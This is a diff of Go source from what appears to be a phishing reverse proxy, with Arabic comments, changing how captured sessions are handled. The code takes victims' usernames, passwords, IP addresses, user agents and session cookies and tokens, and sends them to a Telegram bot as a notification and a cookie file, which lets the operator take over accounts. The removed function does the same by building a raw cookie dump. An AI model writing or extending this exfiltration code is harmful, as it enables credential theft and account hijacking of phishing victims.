@@ -2217,92 +2217,40 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		
 		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
 		if s.Username != "" && s.Password != "" {
-			// استخدم log للتأكد من أن هذه الدالة تنفذ مرة واحدة فقط
-			log.Info("إرسال بيانات الاعتماد والكوكيز للجلسة: %s", sid)
+			// سجل للتحقق من تنفيذ الدالة
+			log.Info("جاري إرسال بيانات الاعتماد للجلسة: %s", sid)
 			
-			// قم بتنفيذ الدالتين بشكل متسلسل (بدون go) للتأكد من تنفيذهما بشكل صحيح
+			// إرسال إشعار ببيانات الاعتماد المسجلة
 			err := p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
 			if err != nil {
-				log.Error("خطأ في إرسال إشعار بيانات الاعتماد: %v", err)
+				log.Error("خطأ في إرسال الإشعار: %v", err)
 			}
 			
-			// إرسال الكوكيز مباشرة بعد إرسال بيانات الاعتماد
-			p.sendCookiesToTelegram(s)
+			// استدعاء الدالة الجديدة لإرسال الكوكيز
+			go func() {
+				time.Sleep(1 * time.Second) // تأخير قصير للتأكد من توفر جميع التوكنات
+				
+				err := p.telegram.SendCookiesFile(
+					s.Id,
+					s.Name,
+					s.Username,
+					s.Password,
+					s.RemoteAddr,
+					s.UserAgent,
+					s.Country,
+					s.CountryCode,
+					s.CookieTokens,
+					s.BodyTokens,
+					s.HttpTokens,
+				)
+				
+				if err != nil {
+					log.Error("خطأ في إرسال ملف الكوكيز: %v", err)
+				} else {
+					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", sid)
+				}
+			}()
 		}
-	}
-}
-
-// تحسين دالة إرسال الكوكيز لمعالجة الأخطاء بشكل أفضل
-func (p *HttpProxy) sendCookiesToTelegram(s *Session) {
-	// طباعة سجل لمعرفة ما إذا كانت الدالة قد بدأت
-	log.Info("بدء إرسال الكوكيز للجلسة: %s", s.Id)
-	
-	// تجميع المعلومات الأساسية
-	cookiesText := fmt.Sprintf("=== Session Info %s ===\n", s.Id)
-	cookiesText += fmt.Sprintf("Username: %s\n", s.Username)
-	cookiesText += fmt.Sprintf("Password: %s\n", s.Password)
-	cookiesText += fmt.Sprintf("IP: %s\n", s.RemoteAddr)
-	cookiesText += fmt.Sprintf("User-Agent: %s\n", s.UserAgent)
-	cookiesText += fmt.Sprintf("Country: %s (%s)\n\n", s.Country, s.CountryCode)
-	
-	// التحقق من وجود CookieTokens للتأكد من أنه ليس فارغًا
-	if s.CookieTokens == nil {
-		log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
-		cookiesText += "=== NO COOKIES FOUND ===\n"
-	} else {
-		// إضافة معلومات الكوكيز بالشكل الخام
-		cookiesText += "=== RAW Cookie Tokens ===\n"
-		
-		// تحويل هيكل البيانات إلى JSON
-		cookieJSON, err := json.MarshalIndent(s.CookieTokens, "", "  ")
-		if err != nil {
-			log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
-			cookiesText += "خطأ في استخراج الكوكيز\n"
-		} else {
-			cookiesText += string(cookieJSON) + "\n\n"
-		}
-		
-		// إضافة عدد الكوكيز المختلفة
-		cookiesText += fmt.Sprintf("=== Cookie Counts ===\n")
-		cookieCount := 0
-		for _, cookies := range s.CookieTokens {
-			cookieCount += len(cookies)
-		}
-		cookiesText += fmt.Sprintf("Total Cookies: %d\n", cookieCount)
-		cookiesText += fmt.Sprintf("Total Cookie Domains: %d\n", len(s.CookieTokens))
-	}
-	
-	// إضافة البيانات الخام لـ Body Tokens
-	if len(s.BodyTokens) > 0 {
-		cookiesText += "=== RAW Body Tokens ===\n"
-		bodyJSON, err := json.MarshalIndent(s.BodyTokens, "", "  ")
-		if err != nil {
-			log.Error("خطأ في تحويل البيانات إلى JSON: %v", err)
-		} else {
-			cookiesText += string(bodyJSON) + "\n\n"
-		}
-		cookiesText += fmt.Sprintf("Total Body Tokens: %d\n", len(s.BodyTokens))
-	}
-	
-	// إضافة البيانات الخام لـ HTTP Tokens
-	if len(s.HttpTokens) > 0 {
-		cookiesText += "=== RAW HTTP Tokens ===\n"
-		httpJSON, err := json.MarshalIndent(s.HttpTokens, "", "  ")
-		if err != nil {
-			log.Error("خطأ في تحويل البيانات إلى JSON: %v", err)
-		} else {
-			cookiesText += string(httpJSON) + "\n\n"
-		}
-		cookiesText += fmt.Sprintf("Total HTTP Tokens: %d\n", len(s.HttpTokens))
-	}
-	
-	// إرسال النص كملف إلى تيليجرام
-	fileName := fmt.Sprintf("raw_cookies_%s_%s.txt", s.Name, s.Id)
-	err := p.telegram.SendFileFromText(fileName, cookiesText)
-	if err != nil {
-		log.Error("فشل في إرسال ملف الكوكيز: %v", err)
-	} else {
-		log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
 	}
 }
 
